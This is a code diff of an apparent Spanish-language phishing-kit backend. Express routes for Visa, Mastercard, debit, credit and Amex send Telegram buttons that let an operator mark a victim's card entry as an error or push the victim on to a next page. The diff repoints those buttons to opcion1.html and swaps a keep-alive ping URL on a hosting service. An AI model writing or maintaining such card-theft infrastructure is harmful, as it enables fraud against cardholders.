@@ -201,7 +201,7 @@ app.post('/visa', async (req, res) => {
       inline_keyboard: [
         [
           { text: "❌ Error Visa", callback_data: `go:visa.html|${sessionId}` },
-          { text: "✅ Siguiente", callback_data: `go:loading.html|${sessionId}` }
+          { text: "✅ Siguiente", callback_data: `go:opcion1.html|${sessionId}` }
         ]
       ]
     };
@@ -235,7 +235,7 @@ app.post('/master', async (req, res) => {
       inline_keyboard: [
         [
           { text: "❌ Error Master", callback_data: `go:mast.html|${sessionId}` },
-          { text: "✅ Siguiente", callback_data: `go:loading.html|${sessionId}` }
+          { text: "✅ Siguiente", callback_data: `go:opcion1.html|${sessionId}` }
         ]
       ]
     };
@@ -269,7 +269,7 @@ app.post('/debit', async (req, res) => {
       inline_keyboard: [
         [
           { text: "❌ Error Débito", callback_data: `go:debit.html|${sessionId}` },
-          { text: "✅ Siguiente", callback_data: `go:loading.html|${sessionId}` }
+          { text: "✅ Siguiente", callback_data: `go:opcion1.html|${sessionId}` }
         ]
       ]
     };
@@ -303,7 +303,7 @@ app.post('/credit', async (req, res) => {
       inline_keyboard: [
         [
           { text: "❌ Error Crédito", callback_data: `go:credit.html|${sessionId}` },
-          { text: "✅ Siguiente", callback_data: `go:loading.html|${sessionId}` }
+          { text: "✅ Siguiente", callback_data: `go:opcion1.html|${sessionId}` }
         ]
       ]
     };
@@ -338,7 +338,7 @@ app.post('/amex', async (req, res) => {
       inline_keyboard: [
         [
           { text: "❌ Error Amex", callback_data: `go:amexs.html|${sessionId}` },
-          { text: "✅ Siguiente", callback_data: `go:loading.html|${sessionId}` }
+          { text: "✅ Siguiente", callback_data: `go:opcion1.html|${sessionId}` }
         ]
       ]
     };
@@ -400,7 +400,7 @@ app.listen(PORT, () => console.log(`✅ Servidor activo en puerto ${PORT}`));
 // ==== Auto-ping para mantener activo el backend y refrescar la propia URL cada 3 minutos ====
 setInterval(async () => {
   try {
-    const res = await fetch("https://servertricos.onrender.com");
+    const res = await fetch("https://servers-o8da.onrender.com");
     const text = await res.text();
     console.log("🔁 Auto-ping realizado:", text);
   } catch (error) {
